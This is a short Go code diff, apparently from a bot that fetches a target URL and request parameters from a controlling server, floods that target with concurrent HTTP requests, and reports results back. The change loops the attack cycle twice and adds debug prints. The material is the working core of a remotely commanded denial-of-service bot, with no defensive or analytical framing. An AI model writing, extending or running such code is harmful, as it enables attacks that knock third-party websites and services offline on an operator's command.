@@ -69,6 +69,7 @@ func SendRequests(target string, requestsNum int, goroutinesNum int, mode string
 
 	for response := range ch {
 		statusCodes = append(statusCodes, response.StatusCode)
+		fmt.Println("v4")
 		fmt.Println(response.StatusCode)
 		response.Body.Close()
 	}
@@ -156,20 +157,24 @@ func StartBot(serverUrl string) {
 
 	targetObject := GetTargetInfo(serverUrl)
 
-	if targetObject.Status && (targetObject.TargetUrl != "") {
-		var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
-			targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
-		SendBotStats(serverUrl, *RequestInfo)
-	}
+	for i := 0; i < 2; i++ {
+		if targetObject.Status && (targetObject.TargetUrl != "") {
+			var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
+				targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
+			SendBotStats(serverUrl, *RequestInfo)
+		}
 
-	if !targetObject.Status {
-		fmt.Println("Server status is set to false.")
-		time.Sleep(10 * time.Second)
-	}
+		if !targetObject.Status {
+			fmt.Println("Server status is set to false.")
+			time.Sleep(10 * time.Second)
+		}
 
-	if targetObject.TargetUrl == "" {
-		fmt.Println("No target link specified.")
-		time.Sleep(10 * time.Second)
+		if targetObject.TargetUrl == "" {
+			fmt.Println("No target link specified.")
+			time.Sleep(10 * time.Second)
+		}
+
+		fmt.Println("Hi")
 	}
 
 }
